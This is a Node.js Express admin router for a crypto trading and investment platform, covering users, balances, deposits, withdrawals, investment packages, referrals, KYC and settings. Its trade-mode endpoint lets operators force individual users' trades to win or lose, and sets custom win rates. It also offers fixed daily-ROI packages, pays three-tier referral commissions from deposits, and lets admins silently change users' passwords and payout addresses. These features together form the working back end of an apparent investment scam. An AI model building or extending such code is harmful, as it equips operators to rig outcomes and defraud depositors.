const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const db = require('../db/database');
const { authenticateToken, requireAdmin } = require('../middleware/auth');

// All routes require Admin privileges
router.use(authenticateToken, requireAdmin);

// 1. Dashboard Overview Analytics
router.get('/stats', (req, res) => {
  try {
    const totalUsers = db.prepare("SELECT count(*) as count FROM users WHERE role = 'user'").get().count;
    const totalBalance = db.prepare('SELECT SUM(wallet_balance) as sum FROM users').get().sum || 0;
    const totalInvestments = db.prepare("SELECT SUM(amount) as sum FROM user_investments WHERE status = 'ACTIVE'").get().sum || 0;
    
    const totalDeposited = db.prepare("SELECT SUM(amount) as sum FROM deposits WHERE status = 'APPROVED'").get().sum || 0;
    const pendingDeposits = db.prepare("SELECT count(*) as count FROM deposits WHERE status = 'PENDING'").get().count;
    
    const totalWithdrawn = db.prepare("SELECT SUM(amount) as sum FROM withdrawals WHERE status = 'APPROVED'").get().sum || 0;
    const pendingWithdrawals = db.prepare("SELECT count(*) as count FROM withdrawals WHERE status = 'PENDING'").get().count;
    
    const totalTrades = db.prepare('SELECT count(*) as count FROM trades').get().count;
    const liveTrades = db.prepare("SELECT count(*) as count FROM trades WHERE status = 'PENDING'").get().count;
    const pendingKyc = db.prepare("SELECT count(*) as count FROM users WHERE kyc_status = 'PENDING'").get().count;

    return res.json({
      success: true,
      data: {
        totalUsers,
        totalBalance,
        totalInvestments,
        totalDeposited,
        pendingDeposits,
        totalWithdrawn,
        pendingWithdrawals,
        totalTrades,
        liveTrades,
        pendingKyc
      }
    });
  } catch (err) {
    console.error('Admin stats error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 2. User Management
router.get('/users', (req, res) => {
  try {
    const search = req.query.search ? `%${req.query.search}%` : '%';
    const users = db.prepare(`
      SELECT id, name, email, role, wallet_balance, tradeable_amount, investment_balance, 
             referral_code, referred_by, phone, kyc_status, status, trade_mode, custom_win_rate, created_at
      FROM users 
      WHERE (email LIKE ? OR name LIKE ? OR referral_code LIKE ?)
      ORDER BY created_at DESC
    `).all(search, search, search);

    return res.json({ success: true, data: users });
  } catch (err) {
    console.error('Admin users error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Update User Balance (Credit/Debit)
router.put('/user/:id/balance', (req, res) => {
  try {
    const { id } = req.params;
    const { amount, action, reason } = req.body; // action: 'ADD' or 'DEDUCT'
    const numAmount = Number(amount);

    if (isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ success: false, message: 'Invalid balance amount.' });
    }

    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    let newBalance = user.wallet_balance;
    if (action === 'ADD') {
      newBalance += numAmount;
    } else if (action === 'DEDUCT') {
      newBalance = Math.max(0, newBalance - numAmount);
    } else {
      return res.status(400).json({ success: false, message: 'Invalid action.' });
    }

    db.prepare('UPDATE users SET wallet_balance = ?, tradeable_amount = ? WHERE id = ?').run(newBalance, newBalance, id);

    // Record transaction
    db.prepare(`
      INSERT INTO transactions (id, user_id, type, amount, description, reference_id)
      VALUES (?, ?, 'ADMIN_ADJUSTMENT', ?, ?, ?)
    `).run(
      'tx-' + uuidv4().substring(0, 10),
      id,
      action === 'ADD' ? numAmount : -numAmount,
      `Admin adjustment (${action}): ${reason || 'Manual balance adjustment'}`,
      req.user.id
    );

    return res.json({
      success: true,
      message: `Successfully ${action === 'ADD' ? 'added' : 'deducted'} $${numAmount.toFixed(2)}. New balance: $${newBalance.toFixed(2)}.`,
      newBalance
    });
  } catch (err) {
    console.error('Admin balance adjust error:', err);
    return res.status(500).json({ success: false, message: 'Failed to adjust balance.' });
  }
});

// Ban/Unban User
router.put('/user/:id/status', (req, res) => {
  try {
    const { id } = req.params;
    const { status } = req.body; // 'ACTIVE' or 'BANNED'

    if (!['ACTIVE', 'BANNED'].includes(status)) {
      return res.status(400).json({ success: false, message: 'Invalid status.' });
    }

    db.prepare('UPDATE users SET status = ? WHERE id = ?').run(status, id);

    return res.json({ success: true, message: `User status updated to ${status}.` });
  } catch (err) {
    console.error('Admin user status error:', err);
    return res.status(500).json({ success: false, message: 'Failed to update user status.' });
  }
});

// Set User Trade Mode (AUTO, FORCE_WIN, FORCE_LOSS)
router.put('/user/:id/trade-mode', (req, res) => {
  try {
    const { id } = req.params;
    const { trade_mode, custom_win_rate } = req.body;

    if (!['AUTO', 'FORCE_WIN', 'FORCE_LOSS'].includes(trade_mode)) {
      return res.status(400).json({ success: false, message: 'Invalid trade mode.' });
    }

    const winRate = Number(custom_win_rate) >= 0 ? Number(custom_win_rate) : 0.50;

    db.prepare('UPDATE users SET trade_mode = ?, custom_win_rate = ? WHERE id = ?').run(trade_mode, winRate, id);

    return res.json({ success: true, message: `User trade mode updated to ${trade_mode} (Win rate: ${Math.round(winRate * 100)}%).` });
  } catch (err) {
    console.error('Admin user trade mode error:', err);
    return res.status(500).json({ success: false, message: 'Failed to update trade mode.' });
  }
});

// Full User Editor (Admin has 100% control over all user fields)
router.put('/user/:id/edit-all', (req, res) => {
  try {
    const { id } = req.params;
    const { 
      name, 
      email, 
      password, 
      withdrawal_password,
      saved_usdt_address,
      saved_usdt_network,
      wallet_balance, 
      investment_balance, 
      kyc_status, 
      status, 
      referral_code, 
      referred_by, 
      phone, 
      trade_mode, 
      custom_win_rate 
    } = req.body;

    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    const bcrypt = require('bcryptjs');
    let newHashedPassword = user.password;
    if (password && password.trim().length > 0) {
      const salt = bcrypt.genSaltSync(10);
      newHashedPassword = bcrypt.hashSync(password.trim(), salt);
    }

    let newHashedWithdrawalPassword = user.withdrawal_password;
    if (withdrawal_password && withdrawal_password.trim().length > 0) {
      const salt = bcrypt.genSaltSync(10);
      newHashedWithdrawalPassword = bcrypt.hashSync(withdrawal_password.trim(), salt);
    }

    const bal = !isNaN(Number(wallet_balance)) ? Number(wallet_balance) : user.wallet_balance;
    const invBal = !isNaN(Number(investment_balance)) ? Number(investment_balance) : user.investment_balance;
    const winRate = !isNaN(Number(custom_win_rate)) ? Number(custom_win_rate) : user.custom_win_rate;

    db.prepare(`
      UPDATE users 
      SET name = ?, email = ?, password = ?, withdrawal_password = ?, saved_usdt_address = ?, saved_usdt_network = ?,
          wallet_balance = ?, tradeable_amount = ?, investment_balance = ?, kyc_status = ?, status = ?, 
          referral_code = ?, referred_by = ?, phone = ?, trade_mode = ?, custom_win_rate = ?
      WHERE id = ?
    `).run(
      name || user.name,
      email ? email.toLowerCase().trim() : user.email,
      newHashedPassword,
      newHashedWithdrawalPassword,
      saved_usdt_address !== undefined ? saved_usdt_address.trim() : (user.saved_usdt_address || ''),
      saved_usdt_network || user.saved_usdt_network || 'TRC-20',
      bal,
      bal,
      invBal,
      kyc_status || user.kyc_status,
      status || user.status,
      referral_code || user.referral_code,
      referred_by !== undefined ? referred_by : user.referred_by,
      phone !== undefined ? phone : user.phone,
      trade_mode || user.trade_mode,
      winRate,
      id
    );

    return res.json({
      success: true,
      message: `User '${name || user.name}' updated successfully with full admin changes!`
    });
  } catch (err) {
    console.error('Admin edit-all user error:', err);
    return res.status(500).json({ success: false, message: 'Failed to update user details.' });
  }
});

// Delete User permanently
router.delete('/user/:id', (req, res) => {
  try {
    const { id } = req.params;
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    if (user.role === 'admin') {
      return res.status(400).json({ success: false, message: 'Cannot delete Super Admin account.' });
    }

    db.prepare('DELETE FROM users WHERE id = ?').run(id);
    return res.json({ success: true, message: `User account '${user.name}' (${user.email}) deleted permanently.` });
  } catch (err) {
    console.error('Admin delete user error:', err);
    return res.status(500).json({ success: false, message: 'Failed to delete user.' });
  }
});


// View specific user's trades
router.get('/user/:id/trades', (req, res) => {
  try {
    const trades = db.prepare('SELECT * FROM trades WHERE user_id = ? ORDER BY created_at DESC LIMIT 100').all(req.params.id);
    return res.json({ success: true, data: trades });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 3. Trade Engine & Platform Trades
router.get('/trades', (req, res) => {
  try {
    const trades = db.prepare(`
      SELECT t.*, u.name as user_name, u.email as user_email 
      FROM trades t
      JOIN users u ON t.user_id = u.id
      ORDER BY t.created_at DESC
      LIMIT 100
    `).all();

    return res.json({ success: true, data: trades });
  } catch (err) {
    console.error('Admin trades error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 4. Deposit Management
router.get('/deposits', (req, res) => {
  try {
    const deposits = db.prepare(`
      SELECT d.*, u.name as user_name, u.email as user_email, u.referral_code, u.referred_by
      FROM deposits d
      JOIN users u ON d.user_id = u.id
      ORDER BY d.created_at DESC
    `).all();

    return res.json({ success: true, data: deposits });
  } catch (err) {
    console.error('Admin deposits error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Approve or Reject Deposit
router.post('/deposit/:id/action', (req, res) => {
  try {
    const { id } = req.params;
    const { action, notes } = req.body; // 'APPROVE' or 'REJECT'

    const deposit = db.prepare('SELECT * FROM deposits WHERE id = ?').get(id);
    if (!deposit) {
      return res.status(404).json({ success: false, message: 'Deposit request not found.' });
    }

    if (deposit.status !== 'PENDING') {
      return res.status(400).json({ success: false, message: `Deposit is already ${deposit.status}.` });
    }

    if (action === 'APPROVE') {
      // 1. Credit user wallet
      const user = db.prepare('SELECT * FROM users WHERE id = ?').get(deposit.user_id);
      const newBal = (user.wallet_balance || 0) + deposit.amount;
      db.prepare('UPDATE users SET wallet_balance = ?, tradeable_amount = ? WHERE id = ?').run(newBal, newBal, user.id);

      // 2. Mark deposit approved
      db.prepare("UPDATE deposits SET status = 'APPROVED', admin_notes = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?").run(notes || 'Approved by Admin', id);

      // 3. Mark transaction completed
      db.prepare("UPDATE transactions SET status = 'COMPLETED' WHERE reference_id = ?").run(id);

      // 4. Distribute 3-Tier Referral Commissions
      distributeReferralCommissions(user, deposit.amount, id);

      return res.json({ success: true, message: `Deposit of $${deposit.amount.toFixed(2)} approved and balance credited!` });
    } else if (action === 'REJECT') {
      db.prepare("UPDATE deposits SET status = 'REJECTED', admin_notes = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?").run(notes || 'Rejected by Admin', id);
      db.prepare("UPDATE transactions SET status = 'REJECTED' WHERE reference_id = ?").run(id);

      return res.json({ success: true, message: `Deposit rejected.` });
    } else {
      return res.status(400).json({ success: false, message: 'Invalid action.' });
    }
  } catch (err) {
    console.error('Deposit action error:', err);
    return res.status(500).json({ success: false, message: 'Failed to process deposit action.' });
  }
});

// Helper for 3-tier commission distribution
function distributeReferralCommissions(user, depositAmount, depositId) {
  try {
    if (!user.referred_by) return;

    const lvl1Setting = db.prepare("SELECT value FROM system_settings WHERE key = 'referral_lvl1_pct'").get();
    const lvl2Setting = db.prepare("SELECT value FROM system_settings WHERE key = 'referral_lvl2_pct'").get();
    const lvl3Setting = db.prepare("SELECT value FROM system_settings WHERE key = 'referral_lvl3_pct'").get();

    const lvl1Pct = Number(lvl1Setting?.value || 10);
    const lvl2Pct = Number(lvl2Setting?.value || 5);
    const lvl3Pct = Number(lvl3Setting?.value || 2);

    // Tier 1 sponsor
    const u1 = db.prepare('SELECT * FROM users WHERE referral_code = ?').get(user.referred_by);
    if (u1) {
      const bonus1 = (depositAmount * lvl1Pct) / 100;
      const newBal1 = u1.wallet_balance + bonus1;
      db.prepare('UPDATE users SET wallet_balance = ?, tradeable_amount = ? WHERE id = ?').run(newBal1, newBal1, u1.id);
      db.prepare(`
        INSERT INTO transactions (id, user_id, type, amount, description, reference_id)
        VALUES (?, ?, 'REFERRAL_BONUS', ?, ?, ?)
      `).run('tx-' + uuidv4().substring(0, 10), u1.id, bonus1, `Level 1 Commission from ${user.name} deposit ($${depositAmount})`, depositId);

      // Tier 2 sponsor
      if (u1.referred_by) {
        const u2 = db.prepare('SELECT * FROM users WHERE referral_code = ?').get(u1.referred_by);
        if (u2) {
          const bonus2 = (depositAmount * lvl2Pct) / 100;
          const newBal2 = u2.wallet_balance + bonus2;
          db.prepare('UPDATE users SET wallet_balance = ?, tradeable_amount = ? WHERE id = ?').run(newBal2, newBal2, u2.id);
          db.prepare(`
            INSERT INTO transactions (id, user_id, type, amount, description, reference_id)
            VALUES (?, ?, 'REFERRAL_BONUS', ?, ?, ?)
          `).run('tx-' + uuidv4().substring(0, 10), u2.id, bonus2, `Level 2 Commission from ${user.name} deposit ($${depositAmount})`, depositId);

          // Tier 3 sponsor
          if (u2.referred_by) {
            const u3 = db.prepare('SELECT * FROM users WHERE referral_code = ?').get(u2.referred_by);
            if (u3) {
              const bonus3 = (depositAmount * lvl3Pct) / 100;
              const newBal3 = u3.wallet_balance + bonus3;
              db.prepare('UPDATE users SET wallet_balance = ?, tradeable_amount = ? WHERE id = ?').run(newBal3, newBal3, u3.id);
              db.prepare(`
                INSERT INTO transactions (id, user_id, type, amount, description, reference_id)
                VALUES (?, ?, 'REFERRAL_BONUS', ?, ?, ?)
              `).run('tx-' + uuidv4().substring(0, 10), u3.id, bonus3, `Level 3 Commission from ${user.name} deposit ($${depositAmount})`, depositId);
            }
          }
        }
      }
    }
  } catch (err) {
    console.error('Commission distribution error:', err);
  }
}

// 5. Withdrawal Management
router.get('/withdrawals', (req, res) => {
  try {
    const withdrawals = db.prepare(`
      SELECT w.*, u.name as user_name, u.email as user_email 
      FROM withdrawals w
      JOIN users u ON w.user_id = u.id
      ORDER BY w.created_at DESC
    `).all();

    return res.json({ success: true, data: withdrawals });
  } catch (err) {
    console.error('Admin withdrawals error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Approve or Reject Withdrawal
router.post('/withdrawal/:id/action', (req, res) => {
  try {
    const { id } = req.params;
    const { action, notes } = req.body;

    const withdrawal = db.prepare('SELECT * FROM withdrawals WHERE id = ?').get(id);
    if (!withdrawal) {
      return res.status(404).json({ success: false, message: 'Withdrawal not found.' });
    }

    if (withdrawal.status !== 'PENDING') {
      return res.status(400).json({ success: false, message: `Withdrawal is already ${withdrawal.status}.` });
    }

    if (action === 'APPROVE') {
      db.prepare("UPDATE withdrawals SET status = 'APPROVED', admin_notes = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?").run(notes || 'Approved & Transferred', id);
      db.prepare("UPDATE transactions SET status = 'COMPLETED' WHERE reference_id = ?").run(id);

      return res.json({ success: true, message: `Withdrawal of $${withdrawal.net_amount.toFixed(2)} marked as approved and transferred.` });
    } else if (action === 'REJECT') {
      // Refund balance to user
      const user = db.prepare('SELECT wallet_balance FROM users WHERE id = ?').get(withdrawal.user_id);
      const refunded = (user.wallet_balance || 0) + withdrawal.amount;
      db.prepare('UPDATE users SET wallet_balance = ?, tradeable_amount = ? WHERE id = ?').run(refunded, refunded, withdrawal.user_id);

      db.prepare("UPDATE withdrawals SET status = 'REJECTED', admin_notes = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?").run(notes || 'Rejected by Admin', id);
      db.prepare("UPDATE transactions SET status = 'REJECTED' WHERE reference_id = ?").run(id);

      return res.json({ success: true, message: `Withdrawal rejected and $${withdrawal.amount.toFixed(2)} refunded to user balance.` });
    } else {
      return res.status(400).json({ success: false, message: 'Invalid action.' });
    }
  } catch (err) {
    console.error('Withdrawal action error:', err);
    return res.status(500).json({ success: false, message: 'Failed to process withdrawal action.' });
  }
});

// 6. Deposit Wallets / Payment Channels CRUD
router.get('/wallets', (req, res) => {
  try {
    const list = db.prepare('SELECT * FROM deposit_wallets ORDER BY is_active DESC').all();
    return res.json({ success: true, data: list });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.post('/wallets', (req, res) => {
  try {
    const { network, address, network_name, account_title, account_number, instructions } = req.body;
    const id = 'wlt-' + uuidv4().substring(0, 8);
    db.prepare(`
      INSERT INTO deposit_wallets (id, network, address, network_name, account_title, account_number, instructions, is_active)
      VALUES (?, ?, ?, ?, ?, ?, ?, 1)
    `).run(id, network, address, network_name, account_title || '', account_number || '', instructions || '');

    return res.json({ success: true, message: 'Payment channel added successfully!' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Failed to add payment channel.' });
  }
});

router.put('/wallets/:id', (req, res) => {
  try {
    const { address, network_name, account_title, account_number, instructions, is_active } = req.body;
    db.prepare(`
      UPDATE deposit_wallets 
      SET address = ?, network_name = ?, account_title = ?, account_number = ?, instructions = ?, is_active = ?
      WHERE id = ?
    `).run(address, network_name, account_title, account_number, instructions, is_active !== undefined ? is_active : 1, req.params.id);

    return res.json({ success: true, message: 'Payment channel updated successfully!' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Failed to update payment channel.' });
  }
});

router.delete('/wallets/:id', (req, res) => {
  try {
    db.prepare('DELETE FROM deposit_wallets WHERE id = ?').run(req.params.id);
    return res.json({ success: true, message: 'Payment channel deleted.' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 7. Investment Packages CRUD
router.get('/packages', (req, res) => {
  try {
    const list = db.prepare('SELECT * FROM investment_packages').all();
    return res.json({ success: true, data: list });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.post('/packages', (req, res) => {
  try {
    const { name, tag, min_amount, max_amount, daily_roi, duration_days, description } = req.body;
    const id = 'pkg-' + uuidv4().substring(0, 8);
    const totalRoi = Number(daily_roi) * Number(duration_days);

    db.prepare(`
      INSERT INTO investment_packages (id, name, tag, min_amount, max_amount, daily_roi, duration_days, total_return_roi, description, is_active)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
    `).run(id, name, tag || 'Custom', Number(min_amount), Number(max_amount), Number(daily_roi), Number(duration_days), totalRoi, description || '');

    return res.json({ success: true, message: 'Investment package created!' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Failed to create package.' });
  }
});

router.put('/packages/:id', (req, res) => {
  try {
    const { name, tag, min_amount, max_amount, daily_roi, duration_days, description, is_active } = req.body;
    const totalRoi = Number(daily_roi) * Number(duration_days);

    db.prepare(`
      UPDATE investment_packages 
      SET name = ?, tag = ?, min_amount = ?, max_amount = ?, daily_roi = ?, duration_days = ?, total_return_roi = ?, description = ?, is_active = ?
      WHERE id = ?
    `).run(name, tag, Number(min_amount), Number(max_amount), Number(daily_roi), Number(duration_days), totalRoi, description, is_active, req.params.id);

    return res.json({ success: true, message: 'Investment package updated!' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Failed to update package.' });
  }
});

router.delete('/packages/:id', (req, res) => {
  try {
    db.prepare('DELETE FROM investment_packages WHERE id = ?').run(req.params.id);
    return res.json({ success: true, message: 'Investment package deleted.' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 8. Spin Wheel Configuration
router.get('/wheel', (req, res) => {
  try {
    const prizes = db.prepare('SELECT * FROM wheel_prizes ORDER BY position ASC').all();
    return res.json({ success: true, data: prizes });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.put('/wheel/prize/:id', (req, res) => {
  try {
    const { label, amount, probability_weight, is_active } = req.body;
    db.prepare(`
      UPDATE wheel_prizes 
      SET label = ?, amount = ?, probability_weight = ?, is_active = ?
      WHERE id = ?
    `).run(label, Number(amount), Number(probability_weight), is_active !== undefined ? is_active : 1, req.params.id);

    return res.json({ success: true, message: 'Wheel prize updated!' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Failed to update prize.' });
  }
});

// 9. Announcements CRUD
router.get('/announcements', (req, res) => {
  try {
    const list = db.prepare('SELECT * FROM announcements ORDER BY created_at DESC').all();
    return res.json({ success: true, data: list });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.post('/announcements', (req, res) => {
  try {
    const { title, content, category } = req.body;
    const id = 'ann-' + uuidv4().substring(0, 8);

    db.prepare(`
      INSERT INTO announcements (id, title, content, category, is_active)
      VALUES (?, ?, ?, ?, 1)
    `).run(id, title, content, category || 'General');

    return res.json({ success: true, message: 'Announcement published!' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Failed to publish announcement.' });
  }
});

router.delete('/announcements/:id', (req, res) => {
  try {
    db.prepare('DELETE FROM announcements WHERE id = ?').run(req.params.id);
    return res.json({ success: true, message: 'Announcement deleted.' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 10. KYC Review
router.get('/kyc', (req, res) => {
  try {
    const users = db.prepare("SELECT id, name, email, kyc_status, kyc_doc, created_at FROM users WHERE kyc_status != 'UNVERIFIED'").all();
    return res.json({ success: true, data: users });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.post('/kyc/:id/action', (req, res) => {
  try {
    const { id } = req.params;
    const { action } = req.body; // 'VERIFY' or 'REJECT'
    const status = action === 'VERIFY' ? 'VERIFIED' : 'REJECTED';

    db.prepare('UPDATE users SET kyc_status = ? WHERE id = ?').run(status, id);
    return res.json({ success: true, message: `User KYC status updated to ${status}.` });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 11. System Settings
router.get('/settings', (req, res) => {
  try {
    const rows = db.prepare('SELECT * FROM system_settings').all();
    const settings = {};
    for (const r of rows) {
      settings[r.key] = r.value;
    }
    return res.json({ success: true, data: settings });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.post('/settings', (req, res) => {
  try {
    const settings = req.body;
    const updateStmt = db.prepare('INSERT OR REPLACE INTO system_settings (key, value) VALUES (?, ?)');
    
    for (const [key, value] of Object.entries(settings)) {
      updateStmt.run(key, String(value));
    }

    return res.json({ success: true, message: 'System settings updated successfully!' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 12. Full User Details Inspector
router.get('/user/:id/full-details', (req, res) => {
  try {
    const { id } = req.params;
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    const deposits = db.prepare('SELECT * FROM deposits WHERE user_id = ? ORDER BY created_at DESC').all(id);
    const withdrawals = db.prepare('SELECT * FROM withdrawals WHERE user_id = ? ORDER BY created_at DESC').all(id);
    const trades = db.prepare('SELECT * FROM trades WHERE user_id = ? ORDER BY created_at DESC LIMIT 50').all(id);
    const transactions = db.prepare('SELECT * FROM transactions WHERE user_id = ? ORDER BY created_at DESC LIMIT 50').all(id);
    const investments = db.prepare('SELECT * FROM user_investments WHERE user_id = ? ORDER BY created_at DESC').all(id);
    const downlines = db.prepare('SELECT id, name, email, referral_code, created_at, status FROM users WHERE referred_by = ?').all(user.referral_code);

    return res.json({
      success: true,
      data: {
        user,
        deposits,
        withdrawals,
        trades,
        transactions,
        investments,
        downlines
      }
    });
  } catch (err) {
    console.error('User details error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

module.exports = router;


